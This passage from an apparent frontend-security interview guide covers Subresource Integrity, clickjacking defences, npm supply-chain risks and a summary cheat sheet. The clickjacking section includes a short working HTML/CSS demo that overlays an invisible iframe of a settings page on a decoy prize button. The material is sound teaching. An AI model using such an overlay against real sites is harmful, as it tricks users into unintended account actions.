  • Web Crypto (crypto.subtle)
  • Credential Management / WebAuthn (passkeys), Payment Request
  • HTTP/2 and HTTP/3, which every browser only does over TLS

So "we'll add HTTPS later" isn't only a security decision — half the modern platform is switched off without it.

Part 12Subresource Integrity

You load a library from a CDN:

<script src="https://cdn.example.com/chart-lib@4.2.0/dist/chart.min.js"></script>

HTTPS guarantees nobody tampered with the file in transit. But it guarantees nothing about the file at the source. If that CDN is compromised, or an account there is taken over, or a maintainer replaces the file, you are executing whatever they now serve — with full privileges on your origin. HTTPS will faithfully and securely deliver the malicious version.

Subresource Integrity lets you pin the expected contents:

<script
  src="https://cdn.example.com/chart-lib@4.2.0/dist/chart.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"></script>

The browser downloads the file, hashes it, and compares. If it doesn't match — one byte different — the resource is not executed. It fails as if it never loaded.

Two things to know:

Why crossorigin is required. To hash the file, the browser needs the full response body. Normally a cross-origin script is loaded "opaquely" — it executes but your page can't inspect its contents. crossorigin="anonymous" switches it to a CORS-mode request (without credentials), which means the CDN must send Access-Control-Allow-Origin. Nice little callback: SRI depends on CORS. Without crossorigin, the check can't run and the script is blocked.

The limits. SRI pins one exact file, so:

  • It breaks on any legitimate update. Point at a floating version like @latest and your site dies the moment they publish. That's arguably a feature — you should be pinning exact versions anyway — but it means SRI is a build-time commitment, not fire-and-forget.
  • It's useless for dynamic endpoints. An API response, a personalised script, anything that changes per user has no stable hash to pin.
  • It only covers what you wrote the tag for. If the pinned script then loads more scripts at runtime, those aren't covered.
  • It doesn't help if the file was malicious when you generated the hash. SRI guarantees "the same file I checked," not "a safe file."

Part 13Clickjacking

A different shape of attack, and a fun one to explain because the mechanism is so physical.

The attacker builds a page that says something innocuous — "Click here to claim your prize." Underneath the button, they load your site in an iframe, positioned so that your "Delete account" or "Transfer funds" or "Authorise this app" button sits exactly where the decoy button appears. Then they set opacity: 0 on the iframe.

<style>
  iframe { position: absolute; top: -220px; left: -50px;
           opacity: 0;              /* 👈 invisible, but still clickable */
           z-index: 2; }
  button { position: absolute; top: 100px; left: 100px; z-index: 1; }
</style>
<button>Claim your prize 🎁</button>
<iframe src="https://app.example.com/settings"></iframe>

The user sees the decoy. They click. The click lands on the invisible iframe — your real site, with the user's real session, doing a real thing they intended to do to something else entirely.

It's a glass pane over a form. You think you're signing the paper in front of you; your pen is actually marking the document underneath.

What makes this awkward is that nothing is technically forged. The click is real. The session is real. The request is real and same-origin from the iframe's perspective. CSRF tokens don't help — the page in the frame is your own page, with your own token in it. SameSite doesn't fully help either, depending on configuration. The only real defence is refusing to be framed.

The modern way: frame-ancestors

Content-Security-Policy: frame-ancestors 'none'

// or, to allow specific embedders:
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com

This is the CSP directive that says who may embed your page. It supports multiple origins and wildcards, and it's the one to reach for now.

The legacy way: X-Frame-Options

X-Frame-Options: DENY          // nobody may frame this
X-Frame-Options: SAMEORIGIN    // only my own origin may

Older, less flexible — its ALLOW-FROM variant was never properly supported, so it's effectively all-or-same-origin. Still worth sending alongside frame-ancestors for ancient clients. Where both are present, browsers that understand frame-ancestors use it and ignore the older header.

Framebusting (legacy, don't rely on it)

Before those headers existed, sites shipped JavaScript like:

❌ Legacy — don't use this as your defence
if (window.top !== window.self) {
  window.top.location = window.self.location;   // 👈 escape the frame
}

It's been comprehensively defeated: sandbox on the iframe can block the navigation, attackers can intercept beforeunload, and it fails entirely with JS disabled. Know it exists so you can explain why it's not the answer; use headers.

A related note worth having: rel="noopener" on target="_blank" links. Without it, the page you open gets a window.opener reference and can navigate your tab to a phishing clone while the user is looking elsewhere ("tabnabbing"). Modern browsers imply noopener by default now, but it's cheap to be explicit, and pairing it with noreferrer also stops leaking your URL.

Part 14The supply chain problem

One last thing, and it's the one that keeps security people up at night.

Run npm ls --all on a typical React app. You'll find somewhere between 800 and 1,500 packages. You chose maybe 20 of them. The rest arrived as dependencies of dependencies, written by people you've never heard of, and updated without you noticing.

Now the uncomfortable bit: every one of those packages runs with your application's full privileges. There is no sandbox. A date-formatting utility buried four levels deep has exactly the same access as your own code: it can read localStorage, read the DOM, read what the user typed into the password field, and fetch anywhere your CSP allows. JavaScript modules have no permission system.

And some of them run on your machine, at install time, via lifecycle scripts, with your shell's privileges and your environment variables — including whatever secrets are in your CI.

This isn't hypothetical. event-stream (2018): a maintainer handed the project to a helpful stranger, who added a payload targeting a specific Bitcoin wallet. ua-parser-js (2021): maintainer account compromised, malware published for a few hours, and it had tens of millions of weekly downloads. Then there's typosquatting (lodahs), dependency confusion (publishing a public package with your internal package's name so the resolver prefers it), and protestware where a maintainer deliberately breaks their own package.

Why this is a frontend problem specifically: your dependencies get bundled and shipped to every user's browser, where they execute inside your origin, next to your session. A backend compromise is bad; a frontend supply chain compromise is XSS distributed to your entire user base, signed and served by you.

What you actually do about it

  • Commit your lockfile, and use npm ci in CI. This is the highest-value, lowest-effort item on the list: it makes builds reproducible and stops a caret range from silently pulling a new version at 3am.
  • Audit regularly — npm audit, Dependabot, Snyk. Noisy, yes; triage anyway. Pay disproportionate attention to anything that ships to the browser.
  • Count before you install. Does this need to be a dependency, or is it 15 lines? Prefer packages with few transitive deps, recent activity, and more than one maintainer.
  • Disable install scripts where you can (npm config set ignore-scripts true) and allowlist the few that genuinely need them.
  • Pin exact versions for critical dependencies rather than living on ^.
  • Use SRI on anything from a CDN, per the previous section.
  • Lock down connect-src in your CSP. This is the underrated one: even if a compromised dependency runs, a tight connect-src means it can't send the data it stole anywhere. It converts a breach into a nuisance.
  • Review lockfile diffs in PRs. A one-line dependency bump that adds 40 transitive packages deserves a second look.

In an interview, "dependency hygiene is part of frontend security because bundled code runs with full privileges in my users' browsers" is a sentence that makes you sound like someone who has shipped things.

Part 15Interview cheat sheet

The morning-of version. One crisp line each.

Origin
Scheme + host + port. All three must match. Subdomains are different origins; the path is irrelevant.
Same-Origin Policy
Script from origin A can't read responses from origin B. It doesn't stop the request being sent, and it doesn't apply to <img>, <script>, <link> or form posts.
CORS
A way for a server to relax SOP for named origins. Browser-enforced, server-declared. Protects users, not servers.
Preflight
An OPTIONS request the browser sends first, for anything beyond GET/POST/HEAD with safelisted headers and a form-ish content type. JSON content-type triggers it.
Does CORS protect my API?
No. Only browsers enforce it. curl, Postman, scripts, mobile apps ignore it. Authn/authz must be server-side.
Why does Postman work but the browser doesn't?
Postman isn't a browser, so nothing enforces CORS. The server was always responding; the browser is withholding the response from your JS.
Can you fix CORS from the frontend?
No — Origin is a forbidden header and no-cors just gives you an unreadable opaque response. Fix the server, or remove the cross-origin-ness with a dev proxy / BFF / same-origin routing.
Why can't * be used with credentials?
Because a credentialed response is personalised, and * would let any site read it. Echo a specific allowlisted origin and add Vary: Origin.
XSS
Attacker data gets interpreted as code inside your origin, inheriting the DOM, non-HttpOnly cookies, storage, and the ability to make authenticated requests.
Stored / reflected / DOM-based
Persisted server-side and hits everyone (worst) / echoed from a URL param and needs a lure / never reaches the server — a client source flows into a client sink.
XSS fix, in order
Contextual output encoding → textContent over innerHTML → DOMPurify with an allowlist if you must render HTML → never eval → CSP as defence in depth.
Why isn't input sanitisation enough?
You don't know the output context at input time, it corrupts legitimate data, and data reaches storage through paths that skip your filter. Validate in, encode out.
Is React immune to XSS?
Safe by default (JSX sets text, not markup), not immune: dangerouslySetInnerHTML, javascript: in a user-supplied href, spreading unvalidated props, ref + direct DOM writes, and SSR state in a <script> tag.
When is dangerouslySetInnerHTML OK?
When the HTML is genuinely trusted, or has been through a real allowlist sanitiser — ideally at write time, stored in a separate field from the raw value.
CSRF
Browsers attach cookies by destination, not by initiator — so a request forged from another site rides the victim's session. The attacker never needs to read the response.
CSRF fixes
SameSite cookies + a CSRF token (synchronizer or double-submit) + Origin checking + never GET for state changes.
Why does a CSRF token work?
The cookie is ambient, the token isn't — and SOP stops the attacker reading the token out of your page.
Does SameSite=Lax fully prevent CSRF?
No. It still permits top-level GET navigations, it's site- not origin-scoped (subdomains count), and browser defaults vary. Strong layer, not the only one.
XSS vs CSRF
XSS runs code in your origin (confidentiality + integrity). CSRF only triggers a request (integrity). XSS defeats every CSRF defence.
CSP
A server-declared allowlist of what may load and execute. unsafe-inline/unsafe-eval gut it; use per-request nonces or hashes, plus strict-dynamic. Roll out with report-only. Defence in depth, not an XSS fix.
Cookie flags
HttpOnly (JS can't read it), Secure (HTTPS only), SameSite (cross-site sending), omit Domain to stay host-only, Max-Age for persistence, and the __Host- prefix to make it all enforceable.
no-cache vs no-store
no-cache = store it but revalidate every time (cheap 304s). no-store = never write it down at all. "Check with me first" vs "don't write this down."
Caching pattern
Hashed asset filenames with max-age=31536000, immutable; index.html with no-cache. Authenticated responses get private/no-store + Vary: Cookie.
localStorage or cookies for a JWT?
localStorage: CSRF-immune but any XSS exfiltrates the token permanently. HttpOnly cookie: XSS can't read it but you must handle CSRF. Modern default — short-lived access token + HttpOnly __Host- refresh cookie with rotation.
Does HttpOnly make XSS not matter?
No. It blocks reading the token, not using it — script can still act as the user. It limits persistence and portability, not capability.
HTTPS
Confidentiality, integrity (the important one — HTTP lets intermediaries inject scripts into your page), and authentication. HSTS closes the first-request gap; mixed active content is blocked; service workers, geolocation and Web Crypto need a secure context.
Subresource Integrity
A hash on a <script>/<link> so a tampered CDN file won't execute. Needs crossorigin. Breaks on any legitimate update; useless for dynamic endpoints.
Clickjacking
Your page framed invisibly over a decoy so real clicks hit real buttons. Prevent with frame-ancestors (modern) and X-Frame-Options (legacy). Framebusting JS is bypassable.
Supply chain
Bundled dependencies execute in your users' browsers with your app's full privileges. Lockfiles + npm ci, audits, fewer deps, no install scripts, SRI, and a tight connect-src to block exfiltration.

One last thing

If you remember nothing else from all of this, remember the two questions from the very beginning, because every answer above hangs off one of them:

"Whose code is running in my page?" — XSS, CSP, SRI, Trusted Types, supply chain.

"Who is this request from, and who may read the answer?" — SOP, CORS, CSRF, cookies, clickjacking.

An interviewer asking about security is rarely checking whether you memorised the nine Cache-Control directives. They're checking whether you understand that the browser is running mutually distrustful code from mutually distrustful parties, at the same time, holding all your credentials — and that every one of these mechanisms is a specific answer to a specific way that arrangement could go wrong.

Once you're thinking in those terms, you'll be able to reason your way to an answer even for a mechanism you've never seen. Which is exactly the thing they're trying to find out. Good luck. 🔒
